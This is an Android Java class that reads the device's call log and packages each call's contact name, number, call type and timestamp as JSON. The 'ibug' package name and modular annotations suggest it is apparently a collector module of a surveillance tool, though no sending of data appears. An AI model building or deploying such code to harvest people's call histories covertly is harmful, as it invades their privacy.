package com.ibug.call;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonObject;

import org.apache.commons.collections4.map.ListOrderedMap;
import com.ibug.IAnnotations.*;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import static com.ibug.misc.Utils.Tag;

public class Call_Log {

    @Constructor
    public Call_Log(Context context) {
        this.context = context;
        collector = new ListOrderedMap<>();
        gson = new GsonBuilder().setPrettyPrinting().create();
    }

    @StartMethod
    public ListOrderedMap<String, JsonObject> getTodaysCallLog() {
        SimpleDateFormat date = new SimpleDateFormat("dd.MM.yyyy", Locale.UK);
        String todaysDate = date.format(new Date());
        try
        {
            ContentResolver resolver = context.getContentResolver();
            Cursor cursor = resolver.query(callLogURI, projection, selection, selectionArgs, sortOrder);
            int iname = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int iduration = cursor.getColumnIndex(CallLog.Calls.DATE);
            int inumber = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int itype = cursor.getColumnIndex(CallLog.Calls.TYPE);
            while (cursor.moveToNext()) {
                String duration = cursor.getString(iduration);
                long callDuration = Long.parseLong(duration);
                // filter todays log
                if (!todaysDate.equals(date.format(callDuration))) break;

                // String dateTime = appDateTimeFormat(callDuration);
                String number = cursor.getString(inumber);
                String name = cursor.getString(iname);
                String type = null;
                switch (Integer.parseInt(cursor.getString(itype))) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        type = OUTGOING_TYPE;
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        type = INCOMING_TYPE;
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        type = MISSED_TYPE;
                        break;
                }

                JsonObject gsonObject = new JsonObject();
                gsonObject.addProperty("type", type);
                gsonObject.addProperty("name", name);
                gsonObject.addProperty("number", number);
                gsonObject.addProperty("duration", callDuration);

                collector.put(duration, gsonObject);
            }

        } catch (Exception ex) { Log.d(Tag, "_CallLog <getTodaysCallLog>: " + ex.getMessage()); }

        return collector.size() > 0 ? collector : null;
    }

    @StartMethod
    public ListOrderedMap<String, JsonObject> getCallLog() {
        try
        {
            ContentResolver resolver = context.getContentResolver();
            Cursor cursor = resolver.query(callLogURI, projection, selection, selectionArgs, sortOrder);
            int iname = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int iduration = cursor.getColumnIndex(CallLog.Calls.DATE);
            int inumber = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int itype = cursor.getColumnIndex(CallLog.Calls.TYPE);
            while (cursor.moveToNext()) {
                String duration = cursor.getString(iduration);
                String number = cursor.getString(inumber);
                String name = cursor.getString(iname);
                String type = null;
                switch (Integer.parseInt(cursor.getString(itype))) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        type = OUTGOING_TYPE;
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        type = INCOMING_TYPE;
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        type = MISSED_TYPE;
                        break;
                }

                long callDuration = Long.parseLong(duration);

                JsonObject gsonObject = new JsonObject();
                gsonObject.addProperty("type", type);
                gsonObject.addProperty("name", name);
                gsonObject.addProperty("number", number);
                gsonObject.addProperty("duration", callDuration);

                collector.put(duration, gsonObject);
            }

        } catch (Exception ex) { Log.d(Tag, "_CallLog <getCallLog>" + ex.getMessage()); }

        return collector.size() > 0 ? collector : null;
    }


    public static final String MISSED_TYPE = "MISSED_CALL";
    public static final String INCOMING_TYPE = "INCOMING_CALL";
    public static final String OUTGOING_TYPE = "OUTGOING_CALL";
    private final Uri callLogURI = CallLog.Calls.CONTENT_URI;
    private final ListOrderedMap<String, JsonObject> collector;
    private final String sortOrder = CallLog.Calls.DATE + " DESC";
    private final String[] selectionArgs = null;
    private final String selection = null;
    private final String[] projection = {
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.NUMBER,
            CallLog.Calls.TYPE,
            CallLog.Calls.DATE,
    };
    private final Context context;
    private final Gson gson;

}
